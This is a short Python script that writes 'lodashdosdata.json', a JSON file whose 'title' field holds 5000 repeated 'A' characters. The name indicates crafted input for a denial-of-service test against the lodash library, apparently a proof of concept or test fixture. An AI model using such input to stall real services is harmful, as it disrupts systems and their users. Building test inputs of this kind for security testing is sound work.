import json

def gen_string(pattern, number):
    return str(pattern) * number

with open("lodashdosdata.json", "w") as outfile:
    value = gen_string('A', 5000)
    data = {"title": value}
    json.dump(data, outfile)